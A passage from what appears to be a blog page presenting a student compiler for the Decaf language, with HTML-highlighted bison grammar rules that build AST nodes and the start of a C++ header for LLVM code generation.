&#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEFTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leftshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_RIGHTSHIFT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Rightshift&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Leq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Geq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_LT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Lt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_GT <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Gt&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_EQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Eq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_NEQ <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Neq&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_AND <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;And&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | <span class="built_in">exp</span> T_OR <span class="built_in">exp</span> &#123; </span><br><span class="line">        decafBinexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafBinexp(<span class="string">&quot;Or&quot;</span>, (decafBinexp*)$<span class="number">1</span>, (decafBinexp*)$<span class="number">3</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    | T_ID &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafArrexp * arr = <span class="keyword">new</span> decafArrexp(*$<span class="number">1</span>,<span class="built_in">exp</span>); </span><br><span class="line">        $$ = arr; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;StringConstant&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;  </span><br><span class="line">    | T_TRUE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;True&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_FALSE &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(<span class="string">&quot;False&quot;</span>,<span class="string">&quot;BoolExpr&quot;</span>); </span><br><span class="line">        $$ = <span class="built_in">exp</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | method_call &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_call: T_ID T_LPAREN para_list_use T_RPAREN &#123;</span><br><span class="line">        decafFunCall *call = <span class="keyword">new</span> decafFunCall();</span><br><span class="line">        decafStmtList* para = (decafStmtList*)$<span class="number">3</span>;</span><br><span class="line">        call-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        call-&gt;put_para(para-&gt;get_para());</span><br><span class="line">        $$ = call;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// initialize LLVM</span></span><br><span class="line">    <span class="comment">// Make the module, which holds all the code.</span></span><br><span class="line">    TheModule = <span class="keyword">new</span> llvm::Module(<span class="string">&quot;Test&quot;</span>, Context);</span><br><span class="line">    <span class="comment">// set up symbol table</span></span><br><span class="line">    <span class="comment">// set up dummy main function</span></span><br><span class="line">    llvm::StringRef newFilename = <span class="string">&quot;DecafComp&quot;</span>;</span><br><span class="line">    TheModule-&gt;setSourceFileName(newFilename);</span><br><span class="line">    <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">    <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">    <span class="comment">// remove symbol table</span></span><br><span class="line">    <span class="comment">// Finish off the main function. (see the WARNING above)</span></span><br><span class="line">    <span class="comment">// return 0 from main, which is EXIT_SUCCESS</span></span><br><span class="line">    <span class="comment">// Validate the generated code, checking for consistency.</span></span><br><span class="line">    <span class="comment">// Print out all of the generated code to stderr</span></span><br><span class="line">    TheModule-&gt;print(llvm::errs(), <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YYTOKENTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafcomp.tab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">extern</span> llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">descriptor</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		llvm::AllocaInst * alloc;</span><br><span class="line">		llvm::Function* func;</span><br><span class="line">		llvm::Value* value;</span><br><span class="line">		llvm::Type* type;</span><br><span class="line">	&#125;;</span><br><span class="line">	llvm::ArrayType *tyg;</span><br><span class="line">	llvmValue kind;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafAST - Base class for all abstract syntax tree nodes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	descriptor des = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> des.value;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Type *<span class="title">getLLVMType</span><span class="params">(llvmType ty, llvm::LLVMContext &amp;Context )</span> </span>&#123; </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ty) &#123;</span><br><span class="line">        <span class="keyword">case</span> voidTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getVoidTy</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> intTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt32Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> boolTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt1Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> stringTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt8PtrTy</span>(Context); </span><br><span class="line">		<span class="keyword">default</span>: <span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;unknown type&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">llvm::Value *<span class="title">listCodegen</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">	llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">		llvm::Value *j = (*i)-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="literal">NULL</span>) &#123; val = j; &#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getString</span><span class="params">(decafAST *d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> d-&gt;<span class="built_in">str</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">string <span class="title">commaList</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">        s = s + (s.<span class="built_in">empty</span>() ? <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>) : <span class="built_in">string</span>(<span class="string">&quot;,&quot;</span>)) + (*i)-&gt;<span class="built_in">str</span>(); </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        s = <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafStmtList - List of Decaf statements</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> 